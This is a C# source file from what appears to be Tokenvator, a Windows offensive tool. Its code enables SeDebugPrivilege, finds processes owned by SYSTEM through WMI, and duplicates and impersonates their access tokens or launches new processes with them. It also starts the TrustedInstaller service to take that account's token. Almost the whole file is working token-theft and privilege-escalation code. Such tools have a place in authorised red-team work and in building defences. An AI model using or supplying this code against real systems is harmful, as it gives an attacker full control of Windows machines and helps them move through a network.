using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

namespace Tokenvator
{
    class Tokens
    {
        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        private IntPtr currentProcessToken;
        private Dictionary<UInt32, String> processes;

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] Administrator privileges required");
            }

            currentProcessToken = new IntPtr();
            Unmanaged.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            Unmanaged.CloseHandle(phNewToken);
            Unmanaged.CloseHandle(hExistingToken);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            if (!Unmanaged.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
            if (!CreateProcessWithTokenW(phNewToken, newProcess, ""))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean ImpersonateUser(Int32 processId)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            if (!Unmanaged.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Enums.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
            if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem(String newProcess)
        {
            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
            EnumerateTokens(LocalSystemNTAccount);

            foreach (UInt32 process in processes.Keys)
            {
                if (StartProcessAsUser((Int32)process, newProcess))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem()
        {
            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
            EnumerateTokens(LocalSystemNTAccount);

            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller(String newProcess)
        {
            Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [*] Running as: " + WindowsIdentity.GetCurrent().Name);
            
            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!StartProcessAsUser((Int32)services.GetServiceProcessId(), newProcess))
            {
                GetError("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetTrustedInstaller()
        {
            Console.WriteLine("[*] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [+] Running as: " + WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!ImpersonateUser((Int32)services.GetServiceProcessId()))
            {
                GetError("ImpersonateUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected static Boolean CreateProcessWithLogonW(IntPtr phNewToken, String name, String arguments)
        {
            Console.WriteLine("[*] CreateProcessWithLogonW");
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
            if (!Unmanaged.CreateProcessWithLogonW(
                "i",
                "j",
                "k",
                0x00000002,
                name,
                arguments,
                0x04000000,
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref startupInfo,
                out processInformation
            ))
            {
                GetError("CreateProcessWithLogonW: ");
                return false;
            }
            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected static Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
        {
            Console.WriteLine("[*] CreateProcessWithTokenW");
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
            if (!Unmanaged.CreateProcessWithTokenW(
                phNewToken,
                Enums.LOGON_FLAGS.NetCredentialsOnly,
                lpProcessName,
                lpProcessArgs,
                Enums.CREATION_FLAGS.NONE,
                IntPtr.Zero,
                IntPtr.Zero,
                ref startupInfo,
                out processInformation
            ))
            {
                GetError("CreateProcessWithTokenW: ");
                return false;
            }
            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public void EnumerateTokens(String userAccount)
        {
            Int32 size = 0;
            List<ManagementObject> systemProcesses = new List<ManagementObject>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            if (!scope.IsConnected)
            {
                Console.WriteLine("[-] Failed to connect to WMI");
            }

            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            Console.WriteLine("[*] Examining " + objectCollection.Count + " processes");
            foreach (ManagementObject managementObject in objectCollection)
            {
                try
                {
                    String[] owner = new String[2];
                    managementObject.InvokeMethod("GetOwner", (object[])owner);
                    if ((owner[1] + "\\" + owner[0]).ToUpper() == userAccount.ToUpper())
                    {
                        processes.Add((UInt32)managementObject["ProcessId"], (String)managementObject["Name"]);
                        size++;
                    }
                }
                catch (ManagementException error)
                {
                    Console.WriteLine("[-] " + error);
                }
            }
            Console.WriteLine("[*] Discovered " + size + " processes");
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public virtual void GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }
            Console.WriteLine("[+] Recieved Handle for: " + name + " (" + processId + ")");
            Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());

            if (Unmanaged.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
            }
            Unmanaged.CloseHandle(hProcess);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static IntPtr OpenThreadTokenChecked()
        {
            IntPtr hToken = new IntPtr();
            Console.WriteLine("[*] Opening Thread Token");
            if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
            {
                Console.WriteLine(" [-] OpenTheadToken Failed");
                Console.WriteLine(" [*] Impersonating Self");
                if (!Unmanaged.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    GetError("ImpersonateSelf");
                    return IntPtr.Zero;
                }
                Console.WriteLine(" [+] Impersonated Self");
                Console.WriteLine(" [*] Retrying");
                if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                {
                    GetError("OpenThreadToken");
                    return IntPtr.Zero;
                }
            }
            Console.WriteLine(" [+] Recieved Thread Token Handle: " + hToken.ToInt32());
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
        {
            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID luid = new Structs._LUID();
            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = 0;

            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 1");
            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 1");
                return;
            }

            ////////////////////////////////////////////////////////////////////////////////
            previousState.PrivilegeCount = 1;
            if (bEnable)
            {
                previousState.Privileges.Attributes |= Constants.SE_PRIVILEGE_ENABLED;
            }
            else
            {
                previousState.Privileges.Attributes ^= (Constants.SE_PRIVILEGE_ENABLED & previousState.Privileges.Attributes);
            }

            ////////////////////////////////////////////////////////////////////////////////
            Structs._TOKEN_PRIVILEGES kluge = new Structs._TOKEN_PRIVILEGES();
            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 2");
            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 2");
                return;
            }

            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID luid = new Structs._LUID();
            if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;

            Structs._TOKEN_PRIVILEGES newState = new Structs._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges");
                return;
            }

            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void EnumerateTokenPrivileges(IntPtr hToken)
        {
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 TokenInfLength = 0;
            Console.WriteLine("[*] Enumerating Token Privileges");
            Unmanaged.GetTokenInformation(
                hToken, 
                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                IntPtr.Zero, 
                TokenInfLength, 
                out TokenInfLength
            );

            if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)  
            {
                GetError("GetTokenInformation - 1 " + TokenInfLength);
                return;
            }
            Console.WriteLine(" [*] GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
            
            ////////////////////////////////////////////////////////////////////////////////
            if (!Unmanaged.GetTokenInformation(
                hToken, 
                Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                lpTokenInformation, 
                TokenInfLength, 
                out TokenInfLength))
            {
                GetError("GetTokenInformation - 2" + TokenInfLength);
                return;
            }
            Console.WriteLine(" [*] GetTokenInformation - Pass 2");
            Structs._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Structs._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Structs._TOKEN_PRIVILEGES_ARRAY));
            Console.WriteLine(" [+] Enumerated " + tokenPrivileges.PrivilegeCount + " Privileges");

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                Int32 cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
                Unmanaged.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                if (cchName < 0 || cchName > Int32.MaxValue)  
                {
                    GetError("LookupPrivilegeName " + cchName);
                    return;
                }

                lpName.EnsureCapacity(cchName + 1);
                if (Unmanaged.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                {
                    Console.WriteLine("  [*] " + lpName.ToString());
                }
                Marshal.FreeHGlobal(lpLuid);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected static void GetError(String location)
        {
            Console.WriteLine(" [-] Function " + location + " failed: " + Marshal.GetLastWin32Error());
        }
    }
}
